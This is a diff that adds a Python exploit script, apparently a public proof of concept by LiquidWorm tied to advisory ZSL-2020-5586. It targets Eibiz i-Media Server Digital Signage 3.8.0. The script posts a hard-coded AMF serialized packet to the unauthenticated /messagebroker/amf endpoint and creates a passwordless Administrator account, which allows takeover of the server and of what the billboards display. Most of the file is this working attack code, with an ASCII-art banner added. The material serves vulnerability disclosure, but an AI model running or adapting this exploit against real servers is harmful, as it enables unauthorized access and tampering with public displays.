@@ -1,0 +1,269 @@
+# Exploit Title: Eibiz i-Media Server Digital Signage 3.8.0 - Authentication Bypass
+# Date: 2020-08-21
+# Exploit Author: LiquidWorm
+# Vendor Homepage: http://www.eibiz.co.th
+# Version: <=3.8.0
+# CVE: N/A
+
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+#
+#
+# Eibiz i-Media Server Digital Signage 3.8.0 (createUser) Authentication Bypass (Add Admin)
+#
+#
+# Vendor: EIBIZ Co.,Ltd.
+# Product web page: http://www.eibiz.co.th
+# Affected version: <=3.8.0
+#
+# Summary: EIBIZ develop advertising platform for out of home media in that
+# time the world called "Digital Signage". Because most business customers
+# still need get outside to get in touch which products and services. Online
+# media alone cannot serve them right place, right time.
+#
+# Desc: The application suffers from unauthenticated privilege escalation and
+# arbitrary user creation vulnerability that allows authentication bypass.
+# Once serialized, an AMF encoded object graph may be used to persist and retrieve
+# application state or allow two endpoints to communicate through the exchange
+# of strongly typed data. These objects are received by the server without validation
+# and authentication and gives the attacker the ability to create any user with
+# any role and bypass the security control in place and modify presented data on
+# the screen/billboard.
+#
+# =========================================================================================
+#
+# # python3 imedia_createUser.py 192.168.1.1 waddup
+#
+# --Sending serialized object...
+# --Replaying...
+#
+# ------------------------------------------------------
+# Admin user 'waddup' successfully created. No password.
+# ------------------------------------------------------
+#
+# =========================================================================================
+#
+# Tested on: Windows Server 2016
+#            Windows Server 2012 R2
+#            Windows Server 2008 R2
+#            Apache Flex
+#            Apache Tomcat/6.0.14
+#            Apache-Coyote/1.1
+#            BlazeDS Application
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2020-5586
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5586.php
+#
+#
+# 26.07.2020
+#
+#
+
+import time as go
+import requests
+import sys
+import re
+
+class __CreateAdmin__:
+    
+    def __init__(self):
+        self.ep = "/messagebroker/amf"
+        self.agent = "CharlieChaplin"
+        self.amfpacket = None
+        self.bytecount = None
+        self.bytesdata = None
+        self.address = None
+        self.headers = None
+        self.usrname = None
+        self.ende = None
+
+    def usage(self):
+        if len(sys.argv) != 3:
+            self.me()
+            msg = "\x20i-Media Server Digital Signage 3.8.0 Auth Bypass/Add Admin"
+            brd = "-" * len(msg + "\x20")
+            print("\n" + brd)
+            print(msg)
+            print("\x20Usage: ./i-media.py [ip] [username]")
+            print(brd)
+            exit(12)
+        else:
+            self.address = sys.argv[1]
+            self.usrname = sys.argv[2]
+            if not "http" in self.address:
+                self.address = "http://{}".format(self.address)
+
+    def amf(self):
+        self.headers = {"User-Agent"      : self.agent,
+                        "Accept"          : "*/*",
+                        "Accept-Language" : "en-US,en;q=0.5",
+                        "Accept-Encoding" : "gzip, deflate",
+                        "Origin"          : self.address,
+                        "Connection"      : "close",
+                        "Referer"         : self.address + "/main.swf",
+                        "Content-Type"    : "application/x-amf"}
+
+        self.amfpacket  = b"\x00\x03\x00\x00\x00\x01\x00\x04\x6E"
+        self.amfpacket += b"\x75\x6C\x6C\x00\x03\x2F\x33\x36\x00"
+        self.amfpacket += b"\x00\x01\xB3\x0A\x00\x00\x00\x01\x11"
+        self.amfpacket += b"\x0A\x81\x13\x4F\x66\x6C\x65\x78\x2E"
+        self.amfpacket += b"\x6D\x65\x73\x73\x61\x67\x69\x6E\x67"
+        self.amfpacket += b"\x2E\x6D\x65\x73\x73\x61\x67\x65\x73"
+        self.amfpacket += b"\x2E\x52\x65\x6D\x6F\x74\x69\x6E\x67"
+        self.amfpacket += b"\x4D\x65\x73\x73\x61\x67\x65\x0D\x73"
+        self.amfpacket += b"\x6F\x75\x72\x63\x65\x13\x6F\x70\x65"
+        self.amfpacket += b"\x72\x61\x74\x69\x6F\x6E\x13\x74\x69"
+        self.amfpacket += b"\x6D\x65\x73\x74\x61\x6D\x70\x09\x62"
+        self.amfpacket += b"\x6F\x64\x79\x11\x63\x6C\x69\x65\x6E"
+        self.amfpacket += b"\x74\x49\x64\x0F\x68\x65\x61\x64\x65"
+        self.amfpacket += b"\x72\x73\x15\x74\x69\x6D\x65\x54\x6F"
+        self.amfpacket += b"\x4C\x69\x76\x65\x17\x64\x65\x73\x74"
+        self.amfpacket += b"\x69\x6E\x61\x74\x69\x6F\x6E\x13\x6D"
+        self.amfpacket += b"\x65\x73\x73\x61\x67\x65\x49\x64\x01"
+        self.amfpacket += b"\x06\x15\x63\x72\x65\x61\x74\x65\x55"
+        self.amfpacket += b"\x73\x65\x72\x04\x00\x09\x03\x01\x0A"
+        self.amfpacket += b"\x81\x73\x1B\x64\x73\x2E\x6D\x6F\x64"
+        self.amfpacket += b"\x65\x6C\x2E\x55\x73\x65\x72\x11\x70"
+        self.amfpacket += b"\x61\x73\x73\x77\x6F\x72\x64\x0D\x63"
+        self.amfpacket += b"\x72\x65\x61\x74\x65\x07\x74\x65\x6C"
+        self.amfpacket += b"\x07\x66\x61\x78\x09\x6E\x61\x6D\x65"
+        self.amfpacket += b"\x0F\x61\x64\x64\x72\x65\x73\x73\x0D"
+        self.amfpacket += b"\x75\x70\x64\x61\x74\x65\x05\x69\x64"
+        self.amfpacket += b"\x0D\x6D\x6F\x62\x69\x6C\x65\x0F\x75"
+        self.amfpacket += b"\x44\x65\x6C\x65\x74\x65\x15\x64\x65"
+        self.amfpacket += b"\x70\x61\x72\x74\x6D\x65\x6E\x74\x09"
+        self.amfpacket += b"\x72\x6F\x6C\x65\x09\x72\x65\x61\x64"
+        self.amfpacket += b"\x0B\x65\x6D\x61\x69\x6C\x0F\x63\x6F"
+        self.amfpacket += b"\x6D\x70\x61\x6E\x79\x06\x01\x03\x06"
+        self.amfpacket += b"\x01\x06\x01\x06" ##################"
+        self.bytecount  = len(self.usrname * 2) + 1
+        self.bytesdata  = [self.bytecount]
+        self.amfpacket += "".join(map(chr, self.bytesdata))
+        self.amfpacket += (bytes(self.usrname.encode("utf-8")))
+        self.amfpacket += b"\x06\x01\x03\x06\x36\x06\x01\x03\x06"
+        self.amfpacket += b"\x01\x06\x1B\x41\x64\x6D\x69\x6E\x69"
+        self.amfpacket += b"\x73\x74\x72\x61\x74\x6F\x72\x03\x06"
+        self.amfpacket += b"\x01\x06\x01\x01\x0A\x0B\x01\x15\x44"
+        self.amfpacket += b"\x53\x45\x6E\x64\x70\x6F\x69\x6E\x74"
+        self.amfpacket += b"\x06\x0D\x6D\x79\x2D\x61\x6D\x66\x09"
+        self.amfpacket += b"\x44\x53\x49\x64\x06\x49\x39\x36\x42"
+        self.amfpacket += b"\x30\x42\x46\x38\x43\x2D\x41\x31\x31"
+        self.amfpacket += b"\x41\x2D\x38\x41\x32\x34\x2D\x38\x31"
+        self.amfpacket += b"\x43\x31\x2D\x35\x38\x37\x45\x41\x33"
+        self.amfpacket += b"\x41\x43\x41\x33\x38\x43\x01\x04\x00"
+        self.amfpacket += b"\x06\x17\x75\x73\x65\x72\x53\x65\x72"
+        self.amfpacket += b"\x76\x69\x63\x65\x06\x49\x39\x39\x46"
+        self.amfpacket += b"\x45\x43\x43\x46\x39\x2D\x34\x41\x38"
+        self.amfpacket += b"\x44\x2D\x46\x46\x34\x31\x2D\x31\x41"
+        self.amfpacket += b"\x36\x36\x2D\x42\x46\x39\x31\x32\x45"
+        self.amfpacket += b"\x42\x42\x44\x36\x35\x36" ##########"
+        
+        print("\n--Sending serialized object...")
+        req = requests.post(self.address + self.ep, headers=self.headers, data=self.amfpacket)
+        #print(req.text.encode("utf-8"))
+        go.sleep(2)
+        print("--Replaying...")
+        req = requests.post(self.address + self.ep, headers=self.headers, data=self.amfpacket)
+        #print(req.text.encode("utf-8"))
+        self.ende = "Admin user '" + self.usrname + "' successfully created. No password."
+        print
+        print("-" * len(self.ende))
+        print(self.ende)
+        print("-" * len(self.ende))
+
+    def me(self):
+        cc = """
+
+                          /`,.,,,.                                              
+                         :.......,,                                             
+                         ,.........7                                            
+                         ,.........$                                            
+                         ......:=+=$                                            
+                        I.....,,:~,.:                                           
+                       $.?7IZDDNNN~.                                            
+                        $$: 8D=:I D,                                            
+                         D~,7NI7DNN                                             
+                         DDD   NNN:                                              
+                          D8.ININ;                                              
+                          D8?7DZS                                                
+                          .ZDNNND D                                             
+                      S..,.~8?,N OO77                                           
+                    N......,..$=77:+?=~8                                        
+                  :......,::=.I8?:+=.=+~++                                      
+                 =.......,:+$=+O:+==~~++++=                                     
+               8...........~7D$::~..~====:++                                    
+              I.............:+.....~~~=~:~+?                                    
+            N,............. .+...,:~=+~~ :+=$                                   
+           ;....... ......, .,....,:=+:,..~=?                                   
+         Z,,......  :............,::~~=...===I                                  
+        =.......$   Z...... =~,,,,.,:~,...,7~=                                  
+       +.......     8.....,.=~~~:.~~~=:~ ..:$==                                 
+       ,......      +,..,,:.=~:~+I:,+I=8:...=?~                                 
+       ,.....,      =...,,,8+=,:~=~I=~~ N...:+?                                 
+       ,.,.,.8      ,..,.,?DN~+~:=+::?D   ..:=?                                 
+       8......      ,...7=Z$DN:?::=I~~$  =..,=+                                 
+        ...,..D   ,....O88D,8D,:=:==+??   ...,:7                                
+         ,....7   ,..:$Z8D8=8DZ~~=~+==?   :..:~+                                
+         ......8D .. .... :?~8D:.:~~=++    ..,~II                               
+         :....~D+:   . . .  ..,..==~===N   +,.,=$                               
+          ,. DDND.......... .,...,===+=N    ..,+?Z                              
+          DD  88 .......... ....,..~+=~N    ..,~?I                              
+                .......   ,,.,,.:...=??     8..~=I$                             
+                .......   ...,,,,. ,:~=      ..:=~?                             
+                ........     ,.,,..,:..      I.:+?+D                            
+                .......     .......,:,,8      ,..IN                             
+                ........    .,.. ..,,:.:        :8N                             
+                ........     ... ..,::,,        I+O                             
+                ........      ......,:,.         O.ZN                           
+                ........ . .    ...,,,,.          D+                            
+                ............    ....,,,.          =                             
+                .......   .      ....,,,          ?                             
+                .......         .....,,,          7                             
+                 ......         . ..,,,,          +                             
+                :.....            ..,.,,          8                             
+                :.......    =.  .....,,,N         8                             
+                ~.......    D.  .....,,,D         8                             
+                ~.......    D.  . ...,,,O         D                             
+                =....            .....,,Z         ?`                              
+                +......   .  :........,.$          +                            
+                I......       ........,.7          =                            
+                Z........     . . ....,,7          D                            
+                N..... ... .    ........I          8                            
+                 ..... ... ,    ........I          8                            
+                 ......  . =   ..  .....I          7                            
+                 :..  .  ..7  8... .....I          ?                            
+                 Z..       D  ..    ....7          N         NND88OOOOOOO88DN   
+                 O..      .   ..    ....O          O      D8OZ$77II777$$ZO8DN   
+                  ... .  ..   .    .....N   NNNNDDD+D888OOZ$7IIIIII7$ZO8DDN     
+                   .,. ....O O..      ..88OOZZ$$777~777IIIIIIIIIIIIIII77$Z8N    
+                    $..  ...88..     ..:ZZZZ$77IIII,IIIIIIIIII77777IIII7ZODN    
+                     ...     ...      ,7777IIIIIIII,IIIIII77$O88OZ7III7Z8N      
+                   Z..       ~7.   . ,IIIIIIIIIIIII,IIII7$O8DN NDO$77$Z8N       
+                   =.. ..   . 8.    .IIIIIIIIIIIIII~I7$Z8DN    NND88DDN         
+                   ...      .?,     I777IIIIIIIII7$~O8N     NNNNN               
+                  8....     .I.     ...7IIIIII7$Z8DD     NNNNN                  
+           NND=....~,=~  ...+I .     . ..I$$ZO8DN  NN NNNNN                     
+         N.+?~.~,=~=... ... $O..   . ...~:..=IINN   $NNN                        
+           ?,:..:,.=N                I.....,,=I+   N8                           
+                                        ~....,8                           
+
+        """
+
+        j = 0
+        while j < len(cc):
+            char = cc[j]
+            sys.stdout.write(char)
+            go.sleep(10.0 / 100000.0)
+            j = j + 1
+
+    def main(self):
+        self.usage()
+        self.amf()
+
+if __name__ == '__main__':
+    __CreateAdmin__().main()
